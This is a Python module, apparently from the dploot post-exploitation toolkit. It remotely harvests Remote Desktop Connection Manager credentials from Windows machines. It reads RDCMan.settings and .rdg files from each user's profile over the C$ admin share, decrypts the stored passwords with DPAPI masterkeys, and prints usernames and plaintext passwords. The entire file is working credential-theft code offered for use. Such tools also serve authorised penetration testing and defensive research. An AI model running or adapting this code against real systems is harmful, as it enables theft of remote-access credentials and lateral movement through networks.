import logging
from typing import Any, List, Tuple
import xml.etree.ElementTree as ET
import base64
from dataclasses import dataclass

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey


@dataclass
class RDGProfile:
    profile_name: str
    username: str
    password: str


@dataclass
class RDGCredProfile(RDGProfile):
    def dump(self) -> None:
        print("[CREDENTIAL PROFILES]")
        print("\tProfile Name:\t%s" % self.profile_name)
        print("\tUsername:\t%s" % self.username)
        print("\tPassword:\t%s" % self.password.decode("latin-1"))
        print()

    def dump_quiet(self) -> None:
        print(
            "[RDG] {} - {}:{}".format(self.profile_name, self.username, self.password.decode("latin-1"))
        )


@dataclass
class RGDLogonProfile(RDGProfile):
    def dump(self) -> None:
        print("[LOGON PROFILES]")
        print("\tProfile Name:\t%s" % self.profile_name)
        print("\tUsername:\t%s" % self.username)
        print("\tPassword:\t%s" % self.password.decode("latin-1"))
        print()

    def dump_quiet(self) -> None:
        print(
            "[RDG] {} - {}:{}".format(self.profile_name, self.username, self.password.decode("latin-1"))
        )


@dataclass
class RDGServerProfile(RDGProfile):
    server_name: str = None

    def dump(self) -> None:
        print("[SERVER PROFILES]")
        print("\tName:\t\t%s" % self.server_name)
        print("\tProfile Name:\t%s" % self.profile_name)
        print("\tUsername:\t%s" % self.username)
        print("\tPassword:\t%s" % self.password.decode("latin-1"))
        print()

    def dump_quiet(self) -> None:
        print(
            "[RDG] {} - {} - {}:{}".format(
                self.profile_name,
                self.server_name,
                self.username,
                self.password.decode("latin-1"),
            )
        )


@dataclass
class RDCMANFile:
    winuser: str
    filepath: str
    rdg_creds: List[RDGProfile]


@dataclass
class RDGFile:
    winuser: str
    filepath: str
    rdg_creds: List[RDGProfile]


class RDGTriage:
    false_positive = [
        ".",
        "..",
        "desktop.ini",
        "Public",
        "Default",
        "Default User",
        "All Users",
    ]
    user_rdcman_settings_generic_filepath = "Users\\%s\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings"
    user_rdg_generic_filepath = ["Users\\%s\\Documents", "Users\\%s\\Desktop"]
    share = "C$"

    def __init__(
        self,
        target: Target,
        conn: DPLootSMBConnection,
        masterkeys: List[Masterkey],
        per_credential_callback: Any = None,
    ) -> None:
        self.target = target
        self.conn = conn

        self._users = None
        self.looted_files = {}
        self.masterkeys = masterkeys

        self.per_credential_callback = per_credential_callback

    def triage_rdcman(self) -> Tuple[List[RDCMANFile], List[RDGFile]]:
        rdcman_files = []
        rdgfiles = []
        for user in self.users:
            try:
                rdcman_user_file, rdg_user_files = self.triage_rdcman_for_user(user)
                rdcman_files.append(rdcman_user_file)
                rdgfiles += rdg_user_files
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    logging.debug(str(e))
        return rdcman_files, rdgfiles

    def triage_rdcman_for_user(self, user: str) -> Tuple[RDCMANFile, List[RDGFile]]:
        rdcman_file = None
        rdgfiles = []
        try:
            user_rcdman_settings_filepath = (
                self.user_rdcman_settings_generic_filepath % user
            )
            rdcmanblob_bytes = self.conn.readFile(
                self.share, user_rcdman_settings_filepath, looted_files=self.looted_files
            )
            if rdcmanblob_bytes:
                logging.debug("Found RDCMan Settings for %s user" % (user))
                if rdcmanblob_bytes is not None and self.masterkeys is not None:
                    xml_data = rdcmanblob_bytes
                    root = ET.fromstring(xml_data)
                    rdcman_file = RDCMANFile(
                        winuser=user,
                        filepath=f"\\\\{self.target.address}\\{self.share}\\{user_rcdman_settings_filepath}",
                        rdg_creds=self.triage_rdcman_settings(root),
                    )
                    rdgfiles_elements = root.find(".//FilesToOpen")
                    for item in rdgfiles_elements.findall(".//item"):
                        filename = item.text
                        if "\\\\" not in filename and "C:\\" in filename:
                            filepath = filename.replace("C:\\", "")
                            rdg_bytes = self.conn.readFile(self.share, filepath, looted_files=self.looted_files)
                            rdg_xml = ET.fromstring(rdg_bytes)
                            rdgfiles.append(
                                RDCMANFile(
                                    winuser=user,
                                    filepath=filename,
                                    rdg_creds=self.triage_rdgprofile(rdg_xml),
                                )
                            )
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))
        return rdcman_file, rdgfiles

    def triage_rdgprofile(self, rdgxml: ET.Element) -> List[RDGProfile]:
        rdg_creds = []
        for cred_profile in rdgxml.findall(".//credentialsProfile"):
            if cred_profile is not None:
                profile_name, username, password = self.triage_credprofile(cred_profile)
                rdg_cred = RDGCredProfile(
                    profile_name=profile_name,
                    username=username,
                    password=password,
                )
                rdg_creds.append(rdg_cred)
                if self.per_credential_callback is not None:
                    self.per_credential_callback(rdg_cred)

        for server_profile in rdgxml.findall(".//server"):
            server_name = server_profile.find(".//properties//name").text
            for item in server_profile.findall(".//logonCredentials"):
                profile_name, username, password = self.triage_credprofile(item)
                rdg_cred = RDGServerProfile(
                    profile_name=profile_name,
                    server_name=server_name,
                    username=username,
                    password=password,
                )
                rdg_creds.append(rdg_cred)
                if self.per_credential_callback is not None:
                    self.per_credential_callback(rdg_cred)
        return rdg_creds

    def triage_rdcman_settings(self, rdcman_settings: ET.Element) -> List[RDGProfile]:
        rdcman_creds = []
        for cred_profile in rdcman_settings.findall(".//credentialsProfile"):
            if cred_profile is not None:
                profile_name, username, password = self.triage_credprofile(cred_profile)
                rdcman_cred = RDGCredProfile(
                    profile_name=profile_name,
                    username=username,
                    password=password,
                )
                rdcman_creds.append(rdcman_cred)
                if self.per_credential_callback is not None:
                    self.per_credential_callback(rdcman_cred)

        for cred_profile in rdcman_settings.findall(".//logonCredentials"):
            if cred_profile is not None:
                profile_name, username, password = self.triage_credprofile(cred_profile)
                rdcman_cred = RGDLogonProfile(
                    profile_name=profile_name,
                    username=username,
                    password=password,
                )
                rdcman_creds.append(rdcman_cred)
                if self.per_credential_callback is not None:
                    self.per_credential_callback(rdcman_cred)
        return rdcman_creds

    def triage_credprofile(self, cred_node: ET.Element) -> Tuple[str, str, Any]:
        profile_name = cred_node.find(".//profileName").text
        full_username = ""
        password = b""
        if cred_node.find(".//userName") is not None:
            username = cred_node.find(".//userName").text
            domain = cred_node.find(".//domain").text
            b64password = cred_node.find(".//password").text

            full_username = username if domain == "" else f"{domain}\\{username}"
            if b64password is not None:
                pass_dpapi_blob = base64.b64decode(b64password)
                masterkey = find_masterkey_for_blob(pass_dpapi_blob, self.masterkeys)
                if masterkey is not None:
                    password = decrypt_blob(pass_dpapi_blob, masterkey)

        return profile_name, full_username, password

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users

        self._users = self.conn.list_users(self.share)

        return self._users
